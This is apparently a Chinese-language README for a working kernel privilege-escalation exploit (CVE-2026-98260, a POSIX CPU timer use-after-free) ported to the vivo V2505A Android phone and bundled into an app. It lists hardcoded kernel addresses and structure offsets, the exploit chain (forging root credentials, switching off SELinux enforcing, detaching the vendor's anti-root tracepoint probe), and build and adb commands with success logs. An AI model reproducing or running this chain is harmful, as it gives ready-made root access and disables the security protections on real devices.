# V2505A CVE-2026-98260 临时提权移植

## 状态

已在当前设备完成临时提权验证：

```text
uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0
kernelsu              221184  1
SELinux=Enforcing
```

全程未修改或刷写 `vendor_boot`，重启后临时 root 和本次内核改动都会消失。
当前设备停在已加载 KernelSU 的状态；如需恢复干净环境，直接重启即可。

## App 集成

V2505A 已作为第三个独立入口合入 App，不复用 `t98260`、`t61269`：

- `ExploitKind.CVE2505A` 只在厂商为 `vivo` 且内核完整 release
  等于 `6.12.23-android16-5-g41f4cb1fa7c7-abogki465038634-4k`
  时自动选择。
- 部署内容只有 `v2505a_run.sh` 和 `v2505a_plant`。
- `v2505a_run.sh` 使用自己的 `ALREADY_LOADED` 和失败重试语义；失败的
  plant 会转成 holder 保留现场，脚本跳过 holder，同一 boot 可直接重试。
- V2505A 入口隐藏不适用的反 root、卸载防护、SUSFS 和 VFS 开关。

当前构建产物：

```text
app/Shark-1.91-v2505a-debug.apk
69425674 B
SHA-256 B783AACD61D42E073887D4B69CE317A36AE5CB0F216981EBED3A27F0956B958C
```

构建验证已完成：

```text
:app:assembleDebug
BUILD SUCCESSFUL
```

已检查 APK 内含 `assets/pyb110/v2505a_plant`、`v2505a_run.sh`
和更新后的 `assets/manual.md`。当前 V2505A 设备上启动 App 后，
信息卡会自动显示 `CVE-2026-98260-vivo-V2505A`。
完整提权流程由用户从干净 boot 自行实测。

## 目标设备

- 型号：`vivo V2505A / PD2505`
- Android：16 / SDK 36
- 构建：`PD2505B_A_16.0.24.7.W10`
- 内核：`6.12.23-android16-5-g41f4cb1fa7c7-abogki465038634-4k`
- Bootloader：`locked`，`verifiedbootstate=green`
- 当前 ADB：`10AG1S2Y6D005Z0`

## 链路

1. 通过 `CVE-2026-98260` 的 POSIX CPU timer UAF 获得零写和 fake-cred 写原语。
2. 将目标 task 的 `cred` 指向受控 fake cred。
3. 关闭 SELinux enforcing。
4. 将 fake cred 的 `uid` 清零。
5. 将 `__tracepoint_sys_exit->funcs` 清零，使 vivo `vr.ko` 的
   `sys_exit` 探针失联。
6. 唤醒 root 子进程，执行 KernelSU late-load。
7. 通过 `su -c id` 验证。

`vr.ko` 的处理采用社区 W1c 方法，参考来源与 BTF 校验见
`reference/README.md`。

## 已恢复常量

内核符号和 BTF 来自 OTA 的 `boot.img`。恢复后的 ELF 位于
`artifacts/kernel/vmlinux-v2505a.elf`。

```c
#define STATIC_TIMER_SITE         0xffffffc0801e0890ULL
#define TIMER_SITE_LOW21          0x1e0890ULL

#define SELINUX_STATE_STATIC      0xffffffc082679370ULL
#define PANIC_ON_WARN_STATIC      0xffffffc0823eafe0ULL
#define SYS_EXIT_TRACEPOINT_STATIC 0xffffffc082594840ULL
#define TRACEPOINT_FUNCS_OFF      0x48ULL

#define ROOT_USER_STATIC          0xffffffc082411ae0ULL
#define INIT_USER_NS_STATIC       0xffffffc082411868ULL
#define INIT_UCOUNTS_STATIC       0xffffffc082413478ULL
#define INIT_GROUPS_STATIC        0xffffffc082412fa8ULL

#define COPY_PROCESS_LOW21        0xcfd98ULL

#define OFF_TASK_CRED             0x900ULL
#define CRED_UID_OFF              0x8ULL
#define CRED_REQ                  0xb8ULL
#define CRED_ALLOC                0xc0ULL
#define TASK_ALLOC_BYTES          0x1440ULL
#define TIMER_ALLOC               0x100ULL
#define FULLCAP                   0x1ffffffffffULL
```

BTF 校验：

- `sizeof(struct cred) = 0xb8`
- `task_struct.cred = 0x900`
- `task_security_struct.exec_sid/create_sid = 0x8/0xc`
- `sizeof(struct tracepoint) = 0x50`
- `tracepoint.funcs = 0x48`

## 编译

构建源码为仓库根目录的 `exploit/src/t61269_plant.c`。

```powershell
$env:ANDROID_NDK_HOME = "C:\path\to\android-ndk-r28c"
.\ports\v2505a\build-v2505a.ps1 -Mode Both
```

产物：

- `bin/v2505a_probe`：只读探测程序，编译时定义 `PROBE_ONLY`
- `bin/v2505a_plant`：完整链路，运行时参数为 `fake`

当前产物 SHA-256：

```text
6F8053829A5D9A2D659FE7C02E79B200732618CD24ED67E6869B727CABD03CE2  v2505a_probe
3902E91058E186E70AD88B5D0D435641E2793C4AC76D80BABAE04F1A66D5746D  v2505a_plant
```

## 运行

推送并设置权限：

```powershell
adb -s 10AG1S2Y6D005Z0 shell "mkdir -p /data/local/tmp/v2505a-port"
adb -s 10AG1S2Y6D005Z0 push .\ports\v2505a\bin\v2505a_probe /data/local/tmp/v2505a-port/v2505a_probe
adb -s 10AG1S2Y6D005Z0 push .\ports\v2505a\bin\v2505a_plant /data/local/tmp/v2505a-port/v2505a_plant
adb -s 10AG1S2Y6D005Z0 shell "chmod 755 /data/local/tmp/v2505a-port/v2505a_probe /data/local/tmp/v2505a-port/v2505a_plant"
```

先执行只读 probe：

```powershell
adb -s 10AG1S2Y6D005Z0 shell "cd /data/local/tmp/v2505a-port && ./v2505a_probe probe"
```

再执行完整链路。`libksud.so` 路径由当前安装的 KernelSU 包动态解析：

```powershell
adb -s 10AG1S2Y6D005Z0 shell "cd /data/local/tmp/v2505a-port && KSUD=`"`$(pm path me.weishu.kernelsu | sed -n 's/^package://p' | sed 's#/base.apk$##')/lib/arm64/libksud.so`" && env PYB110_KSUD=`"`$KSUD`" PYB110_MANAGER_PKG='me.weishu.kernelsu' PYB110_KMI='android16-6.12' ./v2505a_plant fake"
```

成功后进程会保持 parked，日志出现：

```text
[+] stage vr_sys_exit target=...
[+] cred writes landed, waking child
[child] woke uid=0 euid=0
PLANT_CRED_OK child=...
LATE_LOAD_RC=0
```

独立验收：

```powershell
adb -s 10AG1S2Y6D005Z0 shell "su -c id"
adb -s 10AG1S2Y6D005Z0 shell "su -c 'lsmod | grep -i kernelsu; getenforce'"
```

## 实测结果

- `logs/probe-05.log`：`PROBE_OK`，KASLR slide
  `0x1d0b800000`，`vr_sys_exit` funcs 槽
  `0xffffffdd8dd94888`。
- `logs/plant-04.log`：干净 boot 上的第一次完整尝试在第三次 UAF 写
  `fake_uid` 时 burst miss，按保护逻辑驻留，没有继续重复利用。
- 随后重启清理污染，重新 probe。
- `logs/plant-05.log`：完整成功，四次 stage 写全部命中；
  `vr_sys_exit` 零写后子进程未被杀，KernelSU late-load 返回 0。
- `logs/device-status-after-05.txt`：独立的 `su`、模块与 SELinux 验收。

## 注意事项

- UAF 写入具有概率性。任何 stage 失败后都可等 plant 转成 holder 后在同一 boot
  直接重试；不要主动 kill 或 reap holder。
- 不要刷分区或修改 `vendor_boot`。本方案只做运行时内核内存写。
- 每次重启后 KASLR、SELinux、`vr.ko` 状态都会恢复，必须重新运行完整链路。
- KernelSU 包路径包含随机目录，不要硬编码旧路径。

## 目录

```text
ports/v2505a/
├── README.md
├── build-v2505a.ps1
├── artifacts/kernel/vmlinux-v2505a.elf
├── bin/{v2505a_probe,v2505a_plant}
├── logs/
├── reference/README.md
└── tools/
    ├── btf_inspect.py
    ├── kernel_analyze.py
    ├── payload_info.py
    ├── unpack_bootimg.py
    └── zstd_unwrap.py
```
